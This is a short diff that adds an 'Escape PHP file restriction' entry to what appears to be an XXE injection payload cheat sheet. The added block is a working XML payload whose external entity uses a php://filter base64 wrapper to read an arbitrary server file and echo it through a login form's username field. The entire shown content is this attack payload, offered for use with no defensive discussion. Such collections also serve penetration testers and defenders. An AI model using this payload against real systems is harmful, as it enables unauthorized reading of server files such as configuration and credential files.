@@ -320,3 +320,14 @@ Other variants could be:
       <password>BBBB</password>
     </login>
 ```
+
+**Escape PHP file restriction**
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [ <!ENTITY ext SYSTEM "php://filter/read=convert.base64-encode/resource=FILE-TO-PATH"> ]> 
+    <login>
+      <username>&ext;</username>
+      <password>BBBB</password>
+    </login>
+```
